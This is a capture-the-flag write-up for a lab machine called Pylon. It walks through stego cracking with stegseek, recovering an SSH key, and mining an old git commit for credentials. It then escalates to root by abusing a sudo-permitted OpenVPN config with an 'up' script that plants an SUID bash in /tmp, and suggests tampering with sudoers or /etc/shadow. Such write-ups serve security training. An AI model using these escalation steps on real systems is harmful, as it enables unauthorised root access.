##Pylon

#File Analysis
For this room we are provided a file of interest to analyze and utilize to gain a foothold on the target system
```
# exiftool file
ExifTool Version Number         : 12.16
File Name                       : file
Directory                       : .
File Size                       : 381 KiB
File Modification Date/Time     : 2021:04:29 13:51:12-07:00
File Access Date/Time           : 2021:04:29 13:51:12-07:00
File Inode Change Date/Time     : 2021:04:29 13:51:32-07:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```
It seems to be just a picture of a dog but in the metadata we find a link to a cyberchef recipe that converts something to hex then to base85, but it's blank so maybe this will be useful later. We try to extract anything with steghide but can't find anything with a blank passphrase so lets use stegseek to try and find the passphrase
```
# stegseek file.jpg                                                                                         148 ⨯ 1 ⚙
StegSeek version 0.5
Progress: 0.52% (727995 bytes)

[i] --> Found passphrase: "pepper"
[i] Original filename: "lone"
[i] Extracting to "file.jpg.out"
```
The file 'lone' that we extract seems to be just encoded ascii text, however upon closer examination...
```
┌──(root💀kali)-[~/CTFS/pylon]
└─# base64 -d lone > lone.dec
┌──(root💀kali)-[~/CTFS/pylon]
└─# file lone.dec                                                                                
lone.dec: gzip compressed data, from Unix, original size modulo 2^32 10240
┌──(root💀kali)-[~/CTFS/pylon]
└─# mv lone.dec lone.tgz
┌──(root💀kali)-[~/CTFS/pylon]
└─# tar -xvf lone.tgz
lone_id
┌──(root💀kali)-[~/CTFS/pylon]
└─# cat lone_id
-----BEGIN OPENSSH PRIVATE KEY-----

```
We are able to find and extract a unecrypted ssh key presumably for the user lone, so at this point we can fire up the machine and see if we can leverage this ssh key

#Enumeration
```
# Nmap 7.91 scan initiated Fri Apr 30 10:49:33 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,222 10.10.135.152
Nmap scan report for 10.10.135.152
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-04-30 10:49:34 PDT for 5s

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:9f:ae:2d:f8:af:04:bc:8d:6e:2d:55:66:a8:b7:55 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC48TQ2bNsfSzCnjiLLFrhPxsQFtcf4tlGCuD9FFnqSRngeiwGx5OYXmVpTmZ3oQBlg09xQZHhOx0HG1w9wQTeGNfrJ3HbI7Ne4gzCXeNacwNrPwa9kQ4Jhe90rXUGbsnjwrSTXSe/j2vEIDOPo+nlP7HJZBMvzPR8YohRxpn/zmA+1/yldVDueib64A3bwaKZ/bjFs8PvY4kRCwaFF3j0vhHT5bteQWqllpJXOYMe/kXiHa8pZoSamp+fNQm7lxIpXZhcw13cXWauVftAMloIfuOJQnOxmexbCbC0D0LTj/W1KdYIXcw9+4HdNn+R0wFFgOWfL49ImnGeZvIz+/KV7
|   256 ce:65:eb:ce:9f:3f:57:16:6a:79:45:9d:d3:d2:eb:f2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAngdr5IauC530BNjl20lrHWKkcbrDv4sx0cCN3LDhz01JHzSrlxO4+4JizUGzK/nY/RUY1w5iyv9w9cp4cayVc=
|   256 6c:3b:a7:02:3f:a9:cd:83:f2:b9:46:6c:d0:d6:e6:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIxQ6Fpj73z02s4gj/3thP3O1xXMmVp60yt1Ff7wObmh
222/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 39:e1:e4:0e:b5:40:8a:b9:e0:de:d0:6e:78:82:e8:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWmYY++QRFaOM4hlW77VN6PvZcLVj1gqoBUnqRt3WbbrYUzwe9nBU4YdM6LN1d57KrNuzZyrvjS2+9V9Wz7AtsiBGz+7rOMejT4A3hz6GdMUZwAZ7jhDEqqYV/BDP+xcadiLuHWnYFyeSy1xLhVRtZsnU8bXCg9+meHv6PBMq6+TFK5zkmYXBshEyj8LpH9MRGXlwHREkbAcllAr0gNRTrJpwI4/r/O//V6TIA1wyLoDZtYQABVsVoGd9R0vu++HLrNI9+NBi7BVyUvOSkQmsoFNAkMslZv9S7TOG/VQQOrJMjRY/EGPu6JwLHmpd+Kf3q6cOrCjfQOXRo+UaD/E0cfNClCXlJPAa3t8SzqYBK7ebkCwF7fifuOH7vIGgioN9jJNYzcB1hlLcfuBhv69qpe99DL7C4Qqk0ftv9TQgx945JhQiq2LH90eYDUGXmVu0wKLu4mfMfLSUYYgXEZGNkqIW/IM13wagN1FHZBNMsyR1/f/O9igD/qEt0KT70Zfs=
|   256 c6:f6:48:21:fd:07:66:77:fc:ca:3d:83:f5:ca:1b:a3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC9mDTxaeB3QKOzrGC5WK4WId+ZzFhUAgFK5ONKQ7I2Ya+FmBk/R4Uqjq3Epc0Xv31gi6r3k8ytRBYFMmq3L66g=
|   256 17:a2:5b:ae:4e:44:20:fb:28:58:6b:56:34:3a:14:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICwLlQimfX4lrWWdFenHEWZgUWVWRQj1Mt0L4IBeeTnJ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 30 10:49:39 2021 -- 1 IP address (1 host up) scanned in 6.45 seconds
```
Seems like there are two different versions of ssh running on the two open ports found. My intincts tell me that the standard port 22 will not end up working but lets try anyways

Sure enough we are not able to connect with either the original passphrase found or trying to run the same password through the cyberchef recipe we found earlier and using the result, but lets try the same on port 222

```

                  /
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key:
```
Sure enough using the result of the original passphrase used to hide the steg file does not work but using the result of the cyberchef recipe will indeed give us the following menu
```

                  /
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /
 /      (_ /  pyLon Password Manager
                   by LeonM


        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.


Select an option [Q] to Quit:
```
Selecting option 1 gives us the following...
```

                  /
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone
 [2]     FLAG 1                      FLAG 1

Select a password [C] to cancel:
```
Checking both options will give us both flag 1 and lone's credentials so lets try port 22 again with these new credentials.
```
# ssh lone@10.10.135.152
lone@10.10.135.152's password:
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

lone@pylon:~$ ls -la
total 48
drwxr-x--- 6 lone lone 4096 Jan 30 06:46 .
drwxr-xr-x 5 root root 4096 Jan 30 02:31 ..
lrwxrwxrwx 1 lone lone    9 Jan 30 03:29 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30 02:31 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30 02:31 .bashrc
drwx------ 2 lone lone 4096 Jan 30 02:38 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30 02:46 .gitconfig
drwx------ 4 lone lone 4096 Jan 30 06:23 .gnupg
drwxrwxr-x 3 lone lone 4096 Jan 30 02:47 .local
-rw-r--r-- 1 lone lone  807 Jan 30 02:31 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30 06:44 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30 06:27 pylon
-rw-r--r-- 1 lone lone   18 Jan 30 06:12 user1.txt
lone@pylon:~$ ls -la pylon
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30 06:27 .
drwxr-x--- 6 lone lone 4096 Jan 30 06:46 ..
drwxrwxr-x 8 lone lone 4096 Jan 30 06:27 .git
-rw-rw-r-- 1 lone lone  793 Jan 30 02:38 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30 02:38 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30 06:27 pyLon.py
-rw-rw-r-- 1 lone lone 2195 Jan 30 06:27 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30 02:38 pyLon_db.py
```
Plenty of interesting files here with the standouts being a gpg encrypted note and the pylon directory which has the source files for the service we interacted with on port 222 as well as a .git so lets checkout the logs and find any old commits
```
lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls -la
total 52
drwxr-xr-x 3 lone lone  4096 Apr 30 18:11 .
drwxr-x--- 6 lone lone  4096 Jan 30 06:46 ..
drwxrwxr-x 8 lone lone  4096 Apr 30 18:11 .git
-rw-rw-r-- 1 lone lone   793 Jan 30 02:38 README.txt
-rw-rw-r-- 1 lone lone   340 Jan 30 02:38 banner.b64
-rw-rw-r-- 1 lone lone 12288 Apr 30 18:11 pyLon.db
-rw-rw-r-- 1 lone lone  2516 Apr 30 18:11 pyLon_crypt.py
-rw-rw-r-- 1 lone lone  3973 Jan 30 02:38 pyLon_db.py
-rw-rw-r-- 1 lone lone 10290 Apr 30 18:11 pyLon_pwMan.py
lone@pylon:~/pylon$
```
Looks like the initial commit may have a different driver program pyLon_pwMan.py and a pyLon.db file that was later removed so lets try and run it and see if we find anything
We are again asked for credentials but the previous credentials used still work and we are presented the following
```

                  /
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /
 /      (_ /  pyLon Password Manager
                   by LeonM


        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu


Select an option [Q] to Quit:

                  /
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = redacted
```
A couple more options this time around but seelcting decrypt and then the gpg key will give su the credentials needed so lets go decrypt the message we found earlier
```
lone@pylon:~$ gpg -d note_from_pood.gpg
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is redacted

Thanks again.
lone@pylon:~$
```
Looks like the pood user wanted lone to do something with the openvpn config and gave their credentials so lets switch over and see what we can do as pood
```
lone@pylon:~$ su pood
Password:
pood@pylon:/home/lone$ cd ~
pood@pylon:~$ ls -la
total 36
drwxr-x--- 5 pood pood 4096 Jan 30 06:45 .
drwxr-xr-x 5 root root 4096 Jan 30 02:31 ..
lrwxrwxrwx 1 pood pood    9 Jan 30 03:27 .bash_history -> /dev/null
-rw-r--r-- 1 pood pood  220 Jan 30 01:44 .bash_logout
-rw-r--r-- 1 pood pood 3771 Jan 30 01:44 .bashrc
drwx------ 2 pood pood 4096 Jan 30 06:42 .cache
drwx------ 4 pood pood 4096 Jan 30 03:22 .gnupg
drwxr-xr-x 3 pood pood 4096 Jan 30 02:31 .local
-rw-r--r-- 1 pood pood  807 Jan 30 01:44 .profile
-rw-rw-r-- 1 pood pood   29 Jan 30 03:25 user2.txt
pood@pylon:~$ sudo -l
[sudo] password for pood:
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```
We can find the user2 flag in pood's home directory and can also run sudoedit on the openvpn config file locate at /opt/openvpn/client.ovpn
Looking into openvpn options it seems that we can run arbitary commands
```
--up cmd
              Run command cmd after successful TUN/TAP device open (pre --user UID change).
```
So with this in mind we can execute several commands to accomplish our goals but we will go with copying the bash binary and setting the SUID bit so that we can spawn a shell as root
```
pood@pylon:~$ cat /tmp/cmd.sh
#!/bin/bash

cp /bin/bash /tmp
chmod 4777 /tmp/bash
```
We then add the following lines the openvpn config file
```
pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn

client
dev tun
proto udp
remote 127.0.0.1 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
cipher AES-256-CBC
script-security 2
up /tmp/cmd.sh

<ca>
```
With this set up we just need to run the config file, unfortunately pood does not have permissions to do this, but we did neglect to check the sudo permissions for lone and given that pood asked lone to handle this config file perhaps there are some permissions we missed.

```
lone@pylon:~$ sudo -l
[sudo] password for lone:
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

Sure enough lone can actually run the config file as root so we simply run it and lets go check /tmp to find our SUID bash binary
```
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
Fri Apr 30 18:40:35 2021 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Fri Apr 30 18:40:35 2021 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Fri Apr 30 18:40:35 2021 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Fri Apr 30 18:40:35 2021 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Fri Apr 30 18:40:35 2021 UDP link local: (not bound)
Fri Apr 30 18:40:35 2021 UDP link remote: [AF_INET]127.0.0.1:1194
Fri Apr 30 18:40:35 2021 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:1194
Fri Apr 30 18:40:36 2021 TUN/TAP device tun1 opened
Fri Apr 30 18:40:36 2021 do_ifconfig, tt->did_ifconfig_ipv6_setup=0
Fri Apr 30 18:40:36 2021 /sbin/ip link set dev tun1 up mtu 1500
Fri Apr 30 18:40:36 2021 /sbin/ip addr add dev tun1 local 172.31.12.6 peer 172.31.12.5
Fri Apr 30 18:40:36 2021 /dev/shm/cmd.sh tun1 1500 1552 172.31.12.6 172.31.12.5 init
Fri Apr 30 18:40:36 2021 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
Fri Apr 30 18:40:36 2021 Initialization Sequence Completed
```
We got a successful connection and given the documentation our cmd should have now been executed
```
lone@pylon:/tmp$ ls -la
total 1132
drwxrwxrwt 10 root root    4096 Apr 30 18:46 .
drwxr-xr-x 24 root root    4096 Mar 30 10:01 ..
drwxrwxrwt  2 root root    4096 Apr 30 17:43 .ICE-unix
drwxrwxrwt  2 root root    4096 Apr 30 17:43 .Test-unix
drwxrwxrwt  2 root root    4096 Apr 30 17:43 .X11-unix
drwxrwxrwt  2 root root    4096 Apr 30 17:43 .XIM-unix
drwxrwxrwt  2 root root    4096 Apr 30 17:43 .font-unix
-rwsrwxrwx  1 root root 1113504 Apr 30 18:46 bash
-rwxrwxr-x  1 pood pood      52 Apr 30 18:45 cmd.sh
drwx------  3 root root    4096 Apr 30 17:44 systemd-private-e87e05dd36174ddea4abbc2851f80962-openvpn@server.service-qBMNx8
drwx------  3 root root    4096 Apr 30 17:43 systemd-private-e87e05dd36174ddea4abbc2851f80962-systemd-resolved.service-0eRWyl
drwx------  3 root root    4096 Apr 30 17:43 systemd-private-e87e05dd36174ddea4abbc2851f80962-systemd-timesyncd.service-W5rRQG
lone@pylon:/tmp$ ./bash -p
bash-4.4#bash-4.4# cd /root
bash-4.4# ls -la
total 36
drwx------  5 root root 4096 Jan 30 06:52 .
drwxr-xr-x 24 root root 4096 Mar 30 10:01 ..
lrwxrwxrwx  1 root root    9 Jan 30 02:20 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  4 root root 4096 Jan 30 06:47 .gnupg
drwxr-xr-x  3 root root 4096 Jan 30 02:30 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Jan 30 06:52 .vim
-rw-------  1 root root  757 Jan 30 06:52 .viminfo
-rw-r--r--  1 root root  492 Jan 27 19:05 root.txt.gpg
```
Unfortunately the method we chose only effectively gives us a root shell
```
bash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) groups=1002(lone)
```
So we need to actually properly get a shell as root, instead of going back and redoing our exploit/script to account for this we can simply edit the sudoers file or /etc/shadow file to either give one of the users global sudo permission or to make the password hash for root the same as one of the previous users we accessed and can copy their hash over easily.
Whatever method you choose we are just left to do the following
```
bash-4.4# su root
Password:
root@pylon:~# gpg -d root.txt.gpg
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
redacted
```
